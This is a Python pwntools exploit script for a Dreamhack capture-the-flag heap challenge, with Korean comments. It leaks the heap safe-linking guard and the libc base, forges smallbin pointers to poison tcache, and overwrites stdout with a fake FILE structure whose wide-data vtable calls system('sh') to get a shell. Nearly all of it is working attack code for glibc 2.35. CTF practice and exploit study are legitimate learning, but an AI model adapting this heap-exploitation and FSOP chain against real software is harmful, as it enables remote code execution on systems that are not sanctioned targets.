#!/usr/bin/env python3
from pwn import *

context.arch = "amd64"
context.binary = elf = ELF('./main')
# context.log_level = "debug"
context.terminal = ["tmux", "splitw", "-h"]

HOST, PORT = "host3.dreamhack.games 8296".split()

def slog(n, a): return info(": ".join([n, hex(a)]))

s       = lambda data               :p.send(data)
sa      = lambda delim, data        :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim, data        :p.sendlineafter(delim, data)
r       = lambda num=4096           :p.recv(num)
rl      = lambda                    :p.recvline()
ru      = lambda delim, drop=True   :p.recvuntil(delim, drop)
l64     = lambda                    :u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))
uu64    = lambda data               :u64(data.ljust(8, b'\x00'))

if args.REMOTE:
    p = remote(HOST, PORT)
    libc = ELF('./libc.so.6') # or other exact path
else:
    p = process(env={"LD_PRELOAD":"./libc.so.6"}) # or env can be added
    libc = ELF('./libc.so.6')

def get_cat(idx):
    sla(b'Enter your choice: ', b'1')
    sla(b':', str(idx).encode())

def see_cat(idx):
    sla(b'Enter your choice: ', b'2')
    sla(b':', str(idx).encode())
    ru(b'says: ')
    return r(0x90)

def pet_cat(idx, v):
    sla(b'Enter your choice: ', b'3')
    sla(b':', str(idx).encode())
    sa(b':', v)

def rel_cat(idx):
    sla(b'Enter your choice: ', b'4')
    sla(b':', str(idx).encode())

def get_dog(idx):
    sla(b'Enter your choice: ', b'5')
    sla(b':', str(idx).encode())

def see_dog(idx):
    sla(b'Enter your choice: ', b'6')
    sla(b':', str(idx).encode())
    ru(b'says: ')
    return r(0x100)

def pet_dog(idx, v):
    sla(b'Enter your choice: ', b'7')
    sla(b':', str(idx).encode())
    sa(b':', v)

def rel_dog(idx):
    sla(b'Enter your choice: ', b'8')
    sla(b':', str(idx).encode())

# libc6_2.35-0ubuntu3.9_amd64
main_arena = 0x21ace0

# one for the guard lol
for i in range(9):
    get_cat(i)

for i in range(3, 9):
    rel_cat(i)

rel_cat(1)
# tcache: 1, 8, 7, 6, 5, 4, 3

# leak heap guard
guard = u64(see_cat(3)[:8].ljust(8, b'\x00'))
chunk = u64(see_cat(4)[:8].ljust(8, b'\x00')) ^ guard

slog("heap guard", guard)
slog("chunk addr", chunk)

# unsortedbin
# main_arena->cat2->cat0->main_arena
rel_cat(0)
rel_cat(2)

leak = u64(see_cat(0)[:8].ljust(8, b'\x00'))
lb = leak - main_arena
libc.address = lb
slog("libc_base", lb)

get_dog(0) # smallbin에 0, 2 들어가고
# unsortedbin: 0

smallbin = u64(see_cat(0)[:8].ljust(8, b'\x00'))
slog("smallbin_entry", smallbin) # 재활용해서 주소 가져옴

get_cat(1) # cat1
get_cat(9) # cat8
# tcachebin: 7, 6, 5, 4, 3

pet_cat(1, p64(chunk-0x1f0) + p64(chunk-0xb0)) # 아까 smallbin으로 보낸 cat0, cat2의 주소
# cat1의 fd = chunk-0x1f0(cat0)
# cat1의 bk = chunk-0xb0(cat2)

# cat0, cat2를 smallbin에서 tcache로 넘김!!! bin에 연결되어 있는지 검사하지 않음.
rel_cat(0)
rel_cat(2)
# tcachebin: 2, 0, 7, 6, 5, 4, 3

get_cat(0) # cat2
get_cat(2) # cat0
# tcachebin: 7, 6, 5, 4, 3

# cat0 <-> cat1 <-> cat2
pet_cat(2, p64(smallbin) + p64(chunk - 0x150)) # cat0, fd=smallbin, bk=cat1
pet_cat(0, p64(chunk + 0x150) + p64(smallbin)) # cat2, fd=cat1, bk=smallbin

for i in range(3, 8): # tcache 비우기
    get_cat(i)

# cat3~7: 7,6,5,4,3 -> 뺄 목적이라 메모가 의미 없긴 함
# tcache: 0

get_cat(10) # tcache-> 비어있음, fastbin은 애초에 크기 커서 그 쪽으로 갈 일 없음, smallbin에서 가져옴 cat0 가져감

gdb.attach(p)
pause()

pet_cat(0, p64(elf.sym['stdout'] ^ guard)) # stdout, 원래 cat2가 담겨있었음

get_cat(11) # cat2
get_cat(12) # cat1

stdout = chunk + 0x4d0 # 맨 뒤 청크의 뒤쪽 부분
wfile = libc.sym["_IO_wfile_jumps"]
system = libc.sym["system"]
lock = lb + 0x21ca70 # 원래 _lock 주소에 있던 거 그대로 쓰기

# _IO_cleanup이 아님, xsputn 사용
pay = b"  sh\x00\x00\x00\x00"
pay += p64(0) * 3 # read_*
pay += p64(0) * 3 # write_base, write_ptr, write_end
pay += p64(0) * 2 # buf_base, buf_end
pay += p64(0) * 4 # ...to the _makers
pay += p64(system) # wide_vtable + 0x68
pay += p64(1)
pay += p64(0xffffffffffffffff) # 기본값 사용
pay += p64(0)
pay += p64(lock)
pay += p64(0xffffffffffffffff) # 기본값 사용
pay += p64(0)
pay += p64(stdout - 0x10) # wide_data
pay += p64(0) * 3
pay += p64(0) # <= 0
pay += p64(0)
pay += p64(stdout) # wide_vtable
pay += p64(wfile) # vtable

print(hex(len(pay)))
assert len(pay) == 0xe0

get_dog(1)
pet_dog(1, pay) # 담아뒀다가
pet_cat(12, p64(chunk + 0x4d0)) # stdout에 쓰기

p.interactive()